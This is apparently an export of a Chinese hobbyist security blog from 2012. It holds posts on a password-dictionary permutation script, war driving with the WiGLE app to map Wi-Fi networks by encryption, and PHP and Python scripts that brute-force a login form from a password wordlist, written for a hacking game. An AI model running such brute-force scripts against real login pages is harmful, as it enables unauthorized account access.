class=\"line\"> out_file(newRunk)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'CreatDict...'</span></div><div class=\"line\">time1 = time.time() <span class=\"comment\">#定义起始时间</span></div><div class=\"line\">factory_list()</div><div class=\"line\">time2 = time.time() <span class=\"comment\">#运行结束时间</span></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'run time:'</span>, time2 - time1 <span class=\"comment\">#输出并计算运行时间，查看运行效率</span></div></pre></td></tr></table></figure>\n\n<p>其中runk_list 方法可以单独拿出来用作排列组合密码生成。</p>\n","source":"_posts/字典生成工具之排列组合.md","raw":"title: \"字典生成工具之排列组合\"\nid: 80\ndate: 2012-07-01 14:35:37\ntags: \ncategories: \n- 原创作品\n- 技术文章\n---\n\n这个工具还是前几天玩那个hackGame游戏写的，当时游戏需要组合一个字典进行爆破，但是当时手里没有字典生成工具，另外一个原因是题目的要求基本上市面上见到的那些基本完成不了需求，所以就只能自己写了。\n\n字典的功能是 在'f4ck '字符加上0-9组成五位数字的随机密码。\n\n还是上代码先Python的：\n\n```python\n\n#coding: utf-8\n'''\nCreated on 2012-6-28\n\n@author: Return\n'''\nimport time\n\n#===============================================================================\n# runk_list 对数据进行排列组合\n#===============================================================================\ndef runk_list(seq):\n seqn = [seq.pop()]\n while seq:\n newseq = []\n new = seq.pop()\n for i in range(len(seqn)):\n item = seqn[i]\n for j in range(len(item)+1):\n newseq.append(''.join([item[:j],new,item[j:]]))\n seqn = newseq\n return seqn\n\n#===============================================================================\n# out_file 进行文件输出操作\n#===============================================================================\ndef out_file(pwdList):\n fileName = 'third_pwd.txt'\n fp = open(fileName,'a')\n for pwd in pwdList:\n fp.write(pwd+'n')\n fp.close()\n\n#===============================================================================\n# factory_list 加工需要排列组合的数据\n#===============================================================================\ndef factory_list():\n key = ['f','9','c','k'] #固定字符\n for i in range(10): #密码(0-9)+key五位随机生成新key后进行排列组合\n newKey = key[:]\n newKey.append(str(i))\n newRunk = runk_list(newKey)\n out_file(newRunk)\n\nprint 'CreatDict...'\ntime1 = time.time() #定义起始时间\nfactory_list()\ntime2 = time.time() #运行结束时间\nprint 'run time:', time2 - time1 #输出并计算运行时间，查看运行效率\n\n```\n\n其中runk_list 方法可以单独拿出来用作排列组合密码生成。\n","slug":"字典生成工具之排列组合","updated":1421659126000,"excerpt":"","_id":"mrhda37nky7htbn9","comments":true,"layout":"post","photos":[],"link":""},{"title":"户外黑阔之War Driving 应用原理分析及其工具使用","id":280,"date":1355981674000,"tags":[],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i"],"content":"<p>很久没写东西了，最近太忙了～～～</p>\n<p>今天给介绍一个新名词 “War Driving” ，看过幽灵的朋友们有没有留意到最后抓捕大哥组织里面那群人时候他们开着货车移动式攻击有没有印象？如果不感兴趣，那么下面的文章可以不用看了。感兴趣的继续～～</p>\n<p>War Driving：是驾驶攻击也称为接入点映射，这是一种在驾车围绕企业或住所邻里时扫描无线网络名称的活动。</p>\n<p>要想进行驾驶攻击你就要具备一辆车、一台电脑（膝上型电脑）、一个工作在混杂模式下的无线以太网网卡，还有一个装在车顶部或车内的天线。</p>\n<p>因为一个无线局域网可能仅局限于一栋办公楼的范围内，外部使用者就有可能会入侵网络，获得免费的企业内部网络连接，还可能获得公司的一些记录</p>\n<p>和其他一些资源。 用全方位天线和全球定位系统（GPS），驾驶攻击者就能够系统地将802.11b/g/n无线接入点映射地址映射。</p>\n<p>好吧，上面的废话都是来自读娘。驾乘式攻击，其实在现实当中用来收集信息才是比较使用的。那么收集到的信息有哪些？</p>\n<a id=\"more\"></a>\n\n<p>看两张图吧：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/20121222153346861.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/20121222153346861.png\" alt=\"20121222153346861\"></a></p>\n<p>上图是sqllite数据库进行的一个联合查询的结果，也是收集到信息达一部分。</p>\n<p>bssid：是无线路由或者说是无线设备的硬件地址</p>\n<p>lat , lon :是此无线设备达经纬度GPS信息</p>\n<p>ssid：是无线设备达名称</p>\n<p>capabilities:可以明显的看到这个是无线设备达加密方式</p>\n<p>说道这里，很多人可能会说，你丫显得没事要这个有什么用？好吧，确实有点～～</p>\n<p>那么接下来看看这张图片：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/20121222153349302.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/20121222153349302.png\" alt=\"20121222153349302\"></a></p>\n<p>上图是根据第一张图片上面信息以地图达方式展现出来～～～</p>\n<p>上图中，所有绿色为没有加密的无线网络，黄色达为wep加密方式。红色的是wpa/wpa2加密方式。。。。</p>\n<p>至于这个有什么用？试想下，开部车。外卖兜一圈，周围达无线网络信息全部都会收集到了。至于用途，你们懂的～</p>\n<p>下来说分析重点：</p>\n<p>这些信息如何得到的并且在地图上显示？其实需要两样东西，一个GPS用于记录当前所在位置。另外一个就是wifi设备。用于收集</p>\n<p>wifi信息。记录下当前GPS位置周围达wifi信息不就可以了～</p>\n<p>设备需求：</p>\n<p>一般情况下如果要做专业点并且比较精确信息量大，那么就需要一个外接USB GPS，笔记本一台，wifi增益天线。车子一辆</p>\n<p>大家熟知的bt5就自带一个kismon  有需要的可以google youtube上有视频演示。</p>\n<p>不过这些条件有点苛刻。不过我的方法是只要你有一台android手机那么，恭喜你，可以玩玩war driving 了。为什么这么说？</p>\n<p>现在的android手机GPS和wifi都是必备了。那么只要我们写个APP根据上面原理进行采集信息不久行了？很不幸达是APP都有人写好了</p>\n<p>我们直接拿过来用了～～wigle 恩，就是它！</p>\n<p>接下来介绍如何使用它：</p>\n<p>先看看装完以后桌面图标：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/2012122215342748.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/2012122215342748.png\" alt=\"2012122215342748\"></a></p>\n<p>上面圈出来的就是它安装后达图标</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/2012122215345131.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/2012122215345131.png\" alt=\"2012122215345131\"></a></p>\n<p>1.数据库中新增的数据量，也就是本次采集达数据（手机放兜里出去转移圈也就不少了）</p>\n<p>2。数据库中达总数据量</p>\n<p>3。当前GPS信息（好吧，忘记删掉自己达位置信息了）</p>\n<p>4。是当前区域可以接收到的wifi信息</p>\n<p>怎么把这些信息放到地图上看？这个作者还是想的比较周到。支持从数据库中导出kml格式（google地图标记用的就是这个）</p>\n<p>切换到data栏目-》KML Export DB 然后收集插到电脑上存储设备（内存卡）根目录下的wigle目录里面就存在刚才导出达KML</p>\n<p>和sqllite数据库信息如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/2012122215347148.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/2012122215347148.png\" alt=\"2012122215347148\"></a></p>\n<p>其实kml就是xml的数据格式改了个名字而已可以打开看看：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/2012122215349575.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/2012122215349575.png\" alt=\"2012122215349575\"></a></p>\n<p>然后打开google earth然后选择打开文件找到你刚才导出达kml就可以看到效果了～～</p>\n<p>做了一个视频演示用GoogleEarth打开kml，系统为Ubuntu 12。04 为了推广linux，做的一个视频演示吧</p>\n<p><div class=\"CTPnoimage CTPplaceholder\" style=\"width: 480px !important; height: 400px !important; position: relative !important; top: auto !important; right: auto !important; bottom: auto !important; left: auto !important; z-index: auto !important; clear: none !important; float: none !important; vertical-align: -webkit-baseline-middle !important; margin: 0px !important; -webkit-margin-before-collapse: collapse !important; -webkit-margin-after-collapse: collapse !important;\" title=\"http://player.youku.com/player.php/sid/XNDkxMDE2MDEy/v.swf\"></div></p>\n<p><div class=\"CTPplaceholderContainer\" style=\"opacity: 0.5 !important;\"></div></p>\n<p><div class=\"CTPlogoContainer\"></div></p>\n<p><div class=\"CTPlogo\">Flash</div></p>\n<p><div class=\"CTPlogo CTPinset\">Flash</div><br><br><br><br>百度网盘现在地址：<a href=\"http://pan.baidu.com/share/link?shareid=136595&amp;uk=2317334154\" target=\"_blank\" rel=\"external\">http://pan.baidu.com/share/link?shareid=136595&amp;uk=2317334154</a></p>\n","source":"_posts/户外黑阔之war-driving-应用原理分析及其工具使用.md","raw":"title: \"户外黑阔之War Driving 应用原理分析及其工具使用\"\nid: 280\ndate: 2012-12-20 13:34:34\ntags: \ncategories: \n- 原创作品\n- 技术文章\n---\n\n很久没写东西了，最近太忙了～～～\n\n今天给介绍一个新名词 “War Driving” ，看过幽灵的朋友们有没有留意到最后抓捕大哥组织里面那群人时候他们开着货车移动式攻击有没有印象？如果不感兴趣，那么下面的文章可以不用看了。感兴趣的继续～～\n\nWar Driving：是驾驶攻击也称为接入点映射，这是一种在驾车围绕企业或住所邻里时扫描无线网络名称的活动。\n\n要想进行驾驶攻击你就要具备一辆车、一台电脑（膝上型电脑）、一个工作在混杂模式下的无线以太网网卡，还有一个装在车顶部或车内的天线。\n\n因为一个无线局域网可能仅局限于一栋办公楼的范围内，外部使用者就有可能会入侵网络，获得免费的企业内部网络连接，还可能获得公司的一些记录\n\n和其他一些资源。 用全方位天线和全球定位系统（GPS），驾驶攻击者就能够系统地将802.11b/g/n无线接入点映射地址映射。\n\n好吧，上面的废话都是来自读娘。驾乘式攻击，其实在现实当中用来收集信息才是比较使用的。那么收集到的信息有哪些？\n\n<!--more-->\n\n看两张图吧：\n\n[![20121222153346861](http://asset.creturn.com/asset/uploads/2013/11/20121222153346861.png)](http://asset.creturn.com/asset/uploads/2013/11/20121222153346861.png)\n\n上图是sqllite数据库进行的一个联合查询的结果，也是收集到信息达一部分。\n\nbssid：是无线路由或者说是无线设备的硬件地址\n\nlat , lon :是此无线设备达经纬度GPS信息\n\nssid：是无线设备达名称\n\ncapabilities:可以明显的看到这个是无线设备达加密方式\n\n说道这里，很多人可能会说，你丫显得没事要这个有什么用？好吧，确实有点～～\n\n那么接下来看看这张图片：\n\n[![20121222153349302](http://asset.creturn.com/asset/uploads/2013/11/20121222153349302.png)](http://asset.creturn.com/asset/uploads/2013/11/20121222153349302.png)\n\n上图是根据第一张图片上面信息以地图达方式展现出来～～～\n\n上图中，所有绿色为没有加密的无线网络，黄色达为wep加密方式。红色的是wpa/wpa2加密方式。。。。\n\n至于这个有什么用？试想下，开部车。外卖兜一圈，周围达无线网络信息全部都会收集到了。至于用途，你们懂的～\n\n下来说分析重点：\n\n这些信息如何得到的并且在地图上显示？其实需要两样东西，一个GPS用于记录当前所在位置。另外一个就是wifi设备。用于收集\n\nwifi信息。记录下当前GPS位置周围达wifi信息不就可以了～\n\n设备需求：\n\n一般情况下如果要做专业点并且比较精确信息量大，那么就需要一个外接USB GPS，笔记本一台，wifi增益天线。车子一辆\n\n大家熟知的bt5就自带一个kismon  有需要的可以google youtube上有视频演示。\n\n不过这些条件有点苛刻。不过我的方法是只要你有一台android手机那么，恭喜你，可以玩玩war driving 了。为什么这么说？\n\n现在的android手机GPS和wifi都是必备了。那么只要我们写个APP根据上面原理进行采集信息不久行了？很不幸达是APP都有人写好了\n\n我们直接拿过来用了～～wigle 恩，就是它！\n\n接下来介绍如何使用它：\n\n先看看装完以后桌面图标：\n\n[![2012122215342748](http://asset.creturn.com/asset/uploads/2013/11/2012122215342748.png)](http://asset.creturn.com/asset/uploads/2013/11/2012122215342748.png)\n\n上面圈出来的就是它安装后达图标\n\n[![2012122215345131](http://asset.creturn.com/asset/uploads/2013/11/2012122215345131.png)](http://asset.creturn.com/asset/uploads/2013/11/2012122215345131.png)\n\n1.数据库中新增的数据量，也就是本次采集达数据（手机放兜里出去转移圈也就不少了）\n\n2。数据库中达总数据量\n\n3。当前GPS信息（好吧，忘记删掉自己达位置信息了）\n\n4。是当前区域可以接收到的wifi信息\n\n怎么把这些信息放到地图上看？这个作者还是想的比较周到。支持从数据库中导出kml格式（google地图标记用的就是这个）\n\n切换到data栏目-》KML Export DB 然后收集插到电脑上存储设备（内存卡）根目录下的wigle目录里面就存在刚才导出达KML\n\n和sqllite数据库信息如图：\n\n[![2012122215347148](http://asset.creturn.com/asset/uploads/2013/11/2012122215347148.png)](http://asset.creturn.com/asset/uploads/2013/11/2012122215347148.png)\n\n其实kml就是xml的数据格式改了个名字而已可以打开看看：\n\n[![2012122215349575](http://asset.creturn.com/asset/uploads/2013/11/2012122215349575.png)](http://asset.creturn.com/asset/uploads/2013/11/2012122215349575.png)\n\n然后打开google earth然后选择打开文件找到你刚才导出达kml就可以看到效果了～～\n\n做了一个视频演示用GoogleEarth打开kml，系统为Ubuntu 12。04 为了推广linux，做的一个视频演示吧\n<div class=\"CTPnoimage CTPplaceholder\" style=\"width: 480px !important; height: 400px !important; position: relative !important; top: auto !important; right: auto !important; bottom: auto !important; left: auto !important; z-index: auto !important; clear: none !important; float: none !important; vertical-align: -webkit-baseline-middle !important; margin: 0px !important; -webkit-margin-before-collapse: collapse !important; -webkit-margin-after-collapse: collapse !important;\" title=\"http://player.youku.com/player.php/sid/XNDkxMDE2MDEy/v.swf\">\n<div class=\"CTPplaceholderContainer\" style=\"opacity: 0.5 !important;\">\n<div class=\"CTPlogoContainer\">\n<div class=\"CTPlogo\">Flash</div>\n<div class=\"CTPlogo CTPinset\">Flash</div>\n</div>\n</div>\n</div>\n百度网盘现在地址：[http://pan.baidu.com/share/link?shareid=136595&amp;uk=2317334154](http://pan.baidu.com/share/link?shareid=136595&amp;uk=2317334154)\n","slug":"户外黑阔之war-driving-应用原理分析及其工具使用","updated":1421659126000,"excerpt":"<p>很久没写东西了，最近太忙了～～～</p>\n<p>今天给介绍一个新名词 “War Driving” ，看过幽灵的朋友们有没有留意到最后抓捕大哥组织里面那群人时候他们开着货车移动式攻击有没有印象？如果不感兴趣，那么下面的文章可以不用看了。感兴趣的继续～～</p>\n<p>War Driving：是驾驶攻击也称为接入点映射，这是一种在驾车围绕企业或住所邻里时扫描无线网络名称的活动。</p>\n<p>要想进行驾驶攻击你就要具备一辆车、一台电脑（膝上型电脑）、一个工作在混杂模式下的无线以太网网卡，还有一个装在车顶部或车内的天线。</p>\n<p>因为一个无线局域网可能仅局限于一栋办公楼的范围内，外部使用者就有可能会入侵网络，获得免费的企业内部网络连接，还可能获得公司的一些记录</p>\n<p>和其他一些资源。 用全方位天线和全球定位系统（GPS），驾驶攻击者就能够系统地将802.11b/g/n无线接入点映射地址映射。</p>\n<p>好吧，上面的废话都是来自读娘。驾乘式攻击，其实在现实当中用来收集信息才是比较使用的。那么收集到的信息有哪些？</p>\n","_id":"a7foj3on0mqor9ty","comments":true,"layout":"post","photos":[],"link":""},{"title":"博客开通了~","id":8,"date":1341075336000,"tags":["zmi5pqkco8ukeg8a"],"categories":["ng1ki7p1v08zbwrz"],"content":"<h2 id=\"新开博客\">新开博客</h2>\n<p>一直打算开个博客记录下自己学习中的一些东西，以前一直存放在电脑上面。</p>\n<p>但经历了两次硬盘事件后，怕了，必须得弄个博客了要不然资料和学习日记都丢了，</p>\n<p>真实相当悲剧~~</p>\n<p>前期先转载一些别人的文章丰富下自己的博客内容</p>\n<p>专注互联网开发技术、注重互联网安全技术。</p>\n<h3 id=\"BY:_Return_2012-7-1\">BY: Return   2012.7.1</h3>\n","source":"_posts/新开博客.md","raw":"title: \"博客开通了~\"\nid: 8\ndate: 2012-07-01 00:55:36\ntags: \n- 互联网技术\ncategories: \n- 原创作品\n---\n\n##新开博客\n\n一直打算开个博客记录下自己学习中的一些东西，以前一直存放在电脑上面。\n\n但经历了两次硬盘事件后，怕了，必须得弄个博客了要不然资料和学习日记都丢了，\n\n真实相当悲剧~~\n\n前期先转载一些别人的文章丰富下自己的博客内容\n\n专注互联网开发技术、注重互联网安全技术。\n\n###BY: Return   2012.7.1\n","slug":"新开博客","updated":1421659126000,"excerpt":"","_id":"096nlnncebstcqad","comments":true,"layout":"post","photos":[],"link":""},{"title":"无验证码web爆破工具","id":68,"date":1341119726000,"tags":["w1ijt0t2396whe1q"],"categories":["ng1ki7p1v08zbwrz"],"content":"<p>这个其实是前几天玩一个hackGame里面的题目，自己写的爆破工具</p>\n<p>上代码：</p>\n<h2 id=\"PHP版本\">PHP版本</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span></div><div class=\"line\">set_time_limit(<span class=\"number\">0</span>);</div><div class=\"line\"><span class=\"variable\">$pwd</span> = <span class=\"string\">'password/pwdt.txt'</span>; <span class=\"comment\">//密码文件</span></div><div class=\"line\"><span class=\"variable\">$rhost</span> = <span class=\"string\">'http://127.0.0.1/test/test.php'</span>; <span class=\"comment\">//POST数据地址</span></div><div class=\"line\"><span class=\"variable\">$file</span> = fopen(<span class=\"variable\">$pwd</span>, <span class=\"string\">'r'</span>);<span class=\"comment\">//初始化文件句柄</span></div><div class=\"line\"><span class=\"variable\">$curl</span> = curl_init();<span class=\"comment\">//初始化</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">//设置参数</span></div><div class=\"line\"></div><div class=\"line\">curl_setopt(<span class=\"variable\">$curl</span>, CURLOPT_URL, <span class=\"variable\">$rhost</span>);<span class=\"comment\">//设置目标地址</span></div><div class=\"line\">curl_setopt(<span class=\"variable\">$curl</span>, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);<span class=\"comment\">//设置接收反馈内容</span></div><div class=\"line\">curl_setopt(<span class=\"variable\">$curl</span>, CURLOPT_HEADER, <span class=\"number\">0</span>);</div><div class=\"line\">curl_setopt(<span class=\"variable\">$curl</span>, CURLOPT_POST, <span class=\"number\">1</span>);<span class=\"comment\">//设置提交方式为POST</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">while</span> (!feof(<span class=\"variable\">$file</span>)){</div><div class=\"line\"></div><div class=\"line\"> <span class=\"variable\">$fpwd</span> = trim(fgets(<span class=\"variable\">$file</span>));</div><div class=\"line\"></div><div class=\"line\"> <span class=\"variable\">$post_data</span> = <span class=\"keyword\">array</span>(<span class=\"string\">'password'</span>=&gt;<span class=\"variable\">$fpwd</span>); <span class=\"comment\">//POST提交数据</span></div><div class=\"line\"> curl_setopt(<span class=\"variable\">$curl</span>, CURLOPT_POSTFIELDS, <span class=\"variable\">$post_data</span>);</div><div class=\"line\"> <span class=\"comment\">//执行提交内容</span></div><div class=\"line\"> curl_exec(<span class=\"variable\">$curl</span>);</div><div class=\"line\"> <span class=\"comment\">//获取状态反馈信息组</span></div><div class=\"line\"> <span class=\"variable\">$rsinfo</span> = curl_getinfo(<span class=\"variable\">$curl</span>);</div><div class=\"line\"> <span class=\"keyword\">if</span>(intval(<span class=\"variable\">$rsinfo</span>[<span class=\"string\">'http_code'</span>])== <span class=\"number\">302</span>){</div><div class=\"line\"> file_put_contents(<span class=\"string\">'pwd.txt'</span>, <span class=\"variable\">$fpwd</span>);</div><div class=\"line\"> <span class=\"keyword\">echo</span> <span class=\"string\">'密码是：'</span>.<span class=\"variable\">$fpwd</span>.<span class=\"string\">'已经保存到pwd.txt文件中'</span>;</div><div class=\"line\"> <span class=\"keyword\">return</span> ;</div><div class=\"line\"> }</div><div class=\"line\"></div><div class=\"line\">}</div><div class=\"line\"><span class=\"comment\">//关闭资源接口</span></div><div class=\"line\">curl_close(<span class=\"variable\">$curl</span>);</div><div class=\"line\"><span class=\"comment\">//关闭文件句柄释放资源</span></div><div class=\"line\">fclose(<span class=\"variable\">$file</span>);</div></pre></td></tr></table></figure>\n\n<h2><a id=\"more\"></a></h2>\n<h2 id=\"Python_模拟多线程版本：\">Python 模拟多线程版本：</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#/usr/bin python</span></div><div class=\"line\"><span class=\"comment\"># -*- coding: utf-8-*-</span></div><div class=\"line\"><span class=\"comment\"># create data:2012.6.20 By:Return</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> httplib,urllib</div><div class=\"line\"><span class=\"keyword\">import</span> threading</div><div class=\"line\"><span class=\"keyword\">import</span> Queue</div><div class=\"line\">queue=Queue.Queue() <span class=\"comment\">#创建任务队列</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadUrl</span><span class=\"params\">(threading.Thread)</span>:</span></div><div class=\"line\"> <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self,queue)</span>:</span></div><div class=\"line\"> threading.Thread.__init__(self)</div><div class=\"line\"> self.queue=queue</div><div class=\"line\"> <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\"> <span class=\"keyword\">while</span> <span class=\"keyword\">True</span>:</div><div class=\"line\"> <span class=\"keyword\">try</span>:</div><div class=\"line\"> <span class=\"keyword\">if</span>(Queue.Empty):</div><div class=\"line\"> pwd=self.queue.get() <span class=\"comment\">#从队列中获取密码</span></div><div class=\"line\"> <span class=\"keyword\">else</span>:</div><div class=\"line\"> <span class=\"keyword\">break</span></div><div class=\"line\"> params = urllib.urlencode({<span class=\"string\">'password'</span>:pwd}) <span class=\"comment\">#提交的数据</span></div><div class=\"line\"></div><div class=\"line\">headers = {&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;,</div><div class=\"line\"></div><div class=\"line\">&quot;Connection&quot;:&quot;Keep-Alive&quot;}</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#HTTP连接建立，连接地址为你要爆破的目标地址</span></div><div class=\"line\"> conn = httplib.HTTPConnection(<span class=\"string\">'game.creturn.net'</span>)</div><div class=\"line\"> <span class=\"comment\"># url参数为要爆破提交的POST地址</span></div><div class=\"line\"> conn.request(method=&quot;POST&quot;,url=<span class=\"string\">'/login.php'</span>,body=params,headers=headers)</div><div class=\"line\"> response = conn.getresponse()</div><div class=\"line\"> <span class=\"keyword\">if</span> response.status == <span class=\"number\">302</span>:</div><div class=\"line\"> final=&quot;crack success!^_^! Password: %s&quot;%(pwd)</div><div class=\"line\"> fp = open(<span class=\"string\">'rs.txt'</span>,<span class=\"string\">'a+'</span>);</div><div class=\"line\"> fp.write(final); <span class=\"comment\">#如果破解成则忘文件rs.txt写入密码</span></div><div class=\"line\"> fp.close();</div><div class=\"line\"> <span class=\"keyword\">else</span>:</div><div class=\"line\"> conn.close();</div><div class=\"line\"> <span class=\"keyword\">except</span>:</div><div class=\"line\"> <span class=\"keyword\">print</span> <span class=\"string\">'connect time out!'</span></div><div class=\"line\"> self.queue.task_done()</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\"> <span class=\"keyword\">print</span> <span class=\"string\">'Now is creaking....'</span>;</div><div class=\"line\"> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">15</span>):</div><div class=\"line\"> t=ThreadUrl(queue)</div><div class=\"line\"> t.setDaemon(<span class=\"keyword\">True</span>)</div><div class=\"line\"> t.start()</div><div class=\"line\"> pwds = open(<span class=\"string\">'pwd2.txt'</span>,<span class=\"string\">'r'</span>).readlines(); <span class=\"comment\">#读取密码文件</span></div><div class=\"line\"> <span class=\"keyword\">for</span> pwd <span class=\"keyword\">in</span> pwds:</div><div class=\"line\"> p=pwd</div><div class=\"line\"> queue.put(p)</div><div class=\"line\"> queue.join()</div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\"> main()</div></pre></td></tr></table></figure>\n\n","source":"_posts/无验证码web爆破工具.md","raw":"title: \"无验证码web爆破工具\"\nid: 68\ndate: 2012-07-01 13:15:26\ntags: \n- 爆破\ncategories: \n- 原创作品\n---\n\n这个其实是前几天玩一个hackGame里面的题目，自己写的爆破工具\n\n上代码：\n\n##PHP版本\n\n```php\n<?php\nset_time_limit(0);\n$pwd = 'password/pwdt.txt'; //密码文件\n$rhost = 'http://127.0.0.1/test/test.php'; //POST数据地址\n$file = fopen($pwd, 'r');//初始化文件句柄\n$curl = curl_init();//初始化\n\n//设置参数\n\ncurl_setopt($curl, CURLOPT_URL, $rhost);//设置目标地址\ncurl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);//设置接收反馈内容\ncurl_setopt($curl, CURLOPT_HEADER, 0);\ncurl_setopt($curl, CURLOPT_POST, 1);//设置提交方式为POST\n\nwhile (!feof($file)){\n\n $fpwd = trim(fgets($file));\n\n $post_data = array('password'=&gt;$fpwd); //POST提交数据\n curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data);\n //执行提交内容\n curl_exec($curl);\n //获取状态反馈信息组\n $rsinfo = curl_getinfo($curl);\n if(intval($rsinfo['http_code'])== 302){\n file_put_contents('pwd.txt', $fpwd);\n echo '密码是：'.$fpwd.'已经保存到pwd.txt文件中';\n return ;\n }\n\n}\n//关闭资源接口\ncurl_close($curl);\n//关闭文件句柄释放资源\nfclose($file);\n```\n<!--more-->\n---\n##Python 模拟多线程版本：\n\n```python\n#/usr/bin python\n# -*- coding: utf-8-*-\n# create data:2012.6.20 By:Return\n\nimport httplib,urllib\nimport threading\nimport Queue\nqueue=Queue.Queue() #创建任务队列\nclass ThreadUrl(threading.Thread):\n def __init__(self,queue):\n threading.Thread.__init__(self)\n self.queue=queue\n def run(self):\n while True:\n try:\n if(Queue.Empty):\n pwd=self.queue.get() #从队列中获取密码\n else:\n break\n params = urllib.urlencode({'password':pwd}) #提交的数据\n\nheaders = {&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;,\n\n&quot;Connection&quot;:&quot;Keep-Alive&quot;}\n\n#HTTP连接建立，连接地址为你要爆破的目标地址\n conn = httplib.HTTPConnection('game.creturn.net')\n # url参数为要爆破提交的POST地址\n conn.request(method=&quot;POST&quot;,url='/login.php',body=params,headers=headers)\n response = conn.getresponse()\n if response.status == 302:\n final=&quot;crack success!^_^! Password: %s&quot;%(pwd)\n fp = open('rs.txt','a+');\n fp.write(final); #如果破解成则忘文件rs.txt写入密码\n fp.close();\n else:\n conn.close();\n except:\n print 'connect time out!'\n self.queue.task_done()\n\ndef main():\n print 'Now is creaking....';\n for i in range(15):\n t=ThreadUrl(queue)\n t.setDaemon(True)\n t.start()\n pwds = open('pwd2.txt','r').readlines(); #读取密码文件\n for pwd in pwds:\n p=pwd\n queue.put(p)\n queue.join()\nif __name__ == '__main__':\n main()\n```\n","slug":"无验证码web爆破工具","updated":1421659126000,"excerpt":"<p>这个其实是前几天玩一个hackGame里面的题目，自己写的爆破工具</p>\n<p>上代码：</p>\n<h2 id=\"PHP版本\">PHP版本</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div 